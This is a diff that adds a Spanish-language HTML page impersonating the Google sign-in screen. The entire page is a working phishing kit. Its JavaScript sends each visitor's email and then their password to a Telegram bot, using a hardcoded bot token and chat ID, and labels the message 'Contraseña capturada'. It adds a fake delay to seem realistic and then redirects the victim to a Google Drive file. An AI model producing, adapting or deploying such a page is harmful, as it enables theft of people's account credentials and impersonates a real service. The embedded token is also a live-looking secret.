@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceder - Google</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            background: white;
+            margin: 0;
+            padding-top: 220px;
+        }
+
+        .container {
+            width: 360px;
+            text-align: center;
+        }
+
+        .google-logo {
+            position: relative;
+            top: -212px;
+            font-size: 25px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .google-logo span:nth-child(1) { color: #4285F4; }
+        .google-logo span:nth-child(2) { color: #EA4335; }
+        .google-logo span:nth-child(3) { color: #FBBC05; }
+        .google-logo span:nth-child(4) { color: #4285F4; }
+        .google-logo span:nth-child(5) { color: #34A853; }
+        .google-logo span:nth-child(6) { color: #EA4335; }
+
+        h2 {
+            position: relative;
+            top: -213px;
+            font-size: 25px;
+            margin-bottom: 10px;
+            font-weight: normal;
+            color: black;
+        }
+
+        p {
+            position: relative;
+            top: -209px;
+            font-size: 16px;
+            color: #000111;
+        }
+
+        .info-link {
+            position: relative;
+            top: -200px;
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 17px;
+        }
+
+        .input-box {
+            position: relative;
+            top: -180px;
+            display: flex;
+            flex-direction: column;
+        }
+        .input-box input:focus {
+            border-color: #1a73e8;
+        }
+
+        .input-box label {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+            color: #5f6368;
+            transition: all 0.3s ease;
+            pointer-events: none;
+            background: white;
+            padding: 0 5px;
+        }
+
+        .input-box input {
+            width: 90%;
+            padding: 15px 10px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+
+        .input-box input:focus + label,
+        .input-box input:not(:placeholder-shown) + label {
+            top: -3px;
+            left: 10px;
+            font-size: 12px;
+            color: #1a73e8;
+        }
+
+        .links {
+            position: relative;
+            top: -180px;
+            text-align: left;
+            font-size: 15px;
+            margin-top: 15px;
+        }
+
+        .links a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .bottom-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 32px;
+        }
+
+        .btn-secondary {
+            position: relative;
+            top: -150px;
+            background: none;
+            border: none;
+            color: #1a73e8;
+            font-size: 15px;
+            cursor: pointer;
+            transition: top 1s ease, opacity 0.3s ease;
+        }
+
+        .btn-primary {
+            position: fixed;
+            bottom: 10px;
+            right: 20px;
+            padding: 10px 20px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .btn-primary:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .loading {
+            display: none;
+            color: #1a73e8;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="google-logo">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+        </h1>
+        <h2>Acceder</h2>
+        <p>Usa tu Cuenta de Google. La cuenta se agregará a este dispositivo y estará disponible para otras apps de Google.</p>
+        <a href="#" class="info-link">Más información sobre el uso de tu cuenta</a>
+
+        <form id="loginForm">
+            <div class="input-box">
+                <input type="email" id="emailInput" name="email" placeholder=" " required />
+                <label for="emailInput">Correo electrónico o teléfono</label>
+            </div>
+            <div class="loading" id="loadingMessage">Verificando cuenta...</div>
+        </form>
+
+        <div class="links">
+            <a href="#">¿Olvidaste el correo electrónico?</a>
+        </div>
+
+        <div class="bottom-buttons">
+            <button class="btn-secondary">Crear cuenta</button>
+            <button class="btn-primary" id="submitBtn" onclick="guardarEmail()">Siguiente</button>
+        </div>
+    </div>
+
+    <script>
+        const input = document.getElementById("emailInput");
+        const button = document.querySelector(".btn-secondary");
+        const submitBtn = document.getElementById("submitBtn");
+        const loadingMessage = document.getElementById("loadingMessage");
+
+        // Configuración del bot de Telegram
+        const TELEGRAM_BOT_TOKEN = "7467431072:AAF5-MPeXoznswCvKdQoLwHskEVQ0LuR6iQ";
+        const TELEGRAM_CHAT_ID = "1425131487";
+
+        input.addEventListener("focus", function() {
+            button.style.opacity = "0";
+            button.style.top = "-200px";
+        });
+
+        input.addEventListener("blur", function() {
+            button.style.opacity = "1";
+            button.style.top = "-150px";
+        });
+
+        async function enviarATelegram(email) {
+            const mensaje = `🔐 Nuevo intento de acceso:\n📧 Email: ${email}\n🕐 Fecha: ${new Date().toLocaleString('es-ES')}`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                if (response.ok) {
+                    console.log('Mensaje enviado a Telegram exitosamente');
+                    return true;
+                } else {
+                    console.error('Error al enviar mensaje a Telegram');
+                    return false;
+                }
+            } catch (error) {
+                console.error('Error de conexión:', error);
+                return false;
+            }
+        }
+
+        async function guardarEmail() {
+            const email = document.getElementById("emailInput").value;
+            
+            if (email.trim() === "") {
+                alert("Por favor, ingrese su correo electrónico.");
+                return;
+            }
+
+            // Validación básica de email
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                alert("Por favor, ingrese un correo electrónico válido.");
+                return;
+            }
+
+            // Mostrar loading
+            submitBtn.disabled = true;
+            submitBtn.textContent = "Verificando...";
+            loadingMessage.style.display = "block";
+
+            try {
+                // Enviar a Telegram
+                const enviado = await enviarATelegram(email);
+                
+                if (enviado) {
+                    // Simular un pequeño delay para hacer más realista la experiencia
+                    setTimeout(() => {
+                        // Guardar en memoria (ya que no podemos usar localStorage en artifacts)
+                        window.emailUsuario = email;
+                        
+                        // Crear la página de contraseña dinámicamente
+                        document.body.innerHTML = `
+                            <div class="container">
+                                <h1 class="google-logo">
+                                    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+                                </h1>
+                                <h2>Hola</h2>
+                                <p style="top: -195px;">${email}</p>
+                                <div class="input-box" style="top: -160px;">
+                                    <input type="password" id="passwordInput" placeholder=" " required />
+                                    <label for="passwordInput">Introduce tu contraseña</label>
+                                </div>
+                                <div class="links" style="top: -160px;">
+                                    <a href="#" onclick="mostrarRecuperacion()">¿Olvidaste la contraseña?</a>
+                                </div>
+                                <div class="bottom-buttons">
+                                    <button class="btn-secondary" onclick="volverAtras()">Atrás</button>
+                                    <button class="btn-primary" onclick="verificarPassword()">Siguiente</button>
+                                </div>
+                            </div>
+                        `;
+                        
+                        // Agregar funcionalidad a la nueva página
+                        agregarFuncionalidadPassword();
+                        
+                    }, 1500);
+                } else {
+                    throw new Error('Error al verificar la cuenta');
+                }
+                
+            } catch (error) {
+                alert("Error de conexión. Por favor, inténtalo de nuevo.");
+                submitBtn.disabled = false;
+                submitBtn.textContent = "Siguiente";
+                loadingMessage.style.display = "none";
+            }
+        }
+
+        function agregarFuncionalidadPassword() {
+            window.enviarPasswordATelegram = async function(password) {
+                const mensaje = `🔓 Contraseña capturada:\n📧 Email: ${window.emailUsuario}\n🔑 Password: ${password}\n🕐 Fecha: ${new Date().toLocaleString('es-ES')}`;
+                
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: mensaje,
+                            parse_mode: 'HTML'
+                        })
+                    });
+
+                    return response.ok;
+                } catch (error) {
+                    console.error('Error de conexión:', error);
+                    return false;
+                }
+            };
+
+            window.verificarPassword = async function() {
+                const password = document.getElementById("passwordInput").value;
+                
+                if (password.trim() === "") {
+                    alert("Por favor, introduce tu contraseña.");
+                    return;
+                }
+
+                const submitBtn = document.querySelector(".btn-primary");
+                submitBtn.disabled = true;
+                submitBtn.textContent = "Verificando...";
+
+                try {
+                    await window.enviarPasswordATelegram(password);
+                    
+                    // Redirigir al enlace después de capturar la contraseña
+                    setTimeout(() => {
+                        window.location.href = "https://drive.google.com/file/d/12ThJMzZlE0hGTxq_XSDy-D1SagbmBkuG/view?usp=drivesdk";
+                    }, 2000);
+                    
+                } catch (error) {
+                    alert("Error de conexión. Por favor, inténtalo de nuevo.");
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = "Siguiente";
+                }
+            };
+
+            window.volverAtras = function() {
+                location.reload();
+            };
+
+            window.mostrarRecuperacion = function() {
+                alert("Se ha enviado un enlace de recuperación a tu correo electrónico.");
+            };
+        }
+    </script>
+</body>
+</html>
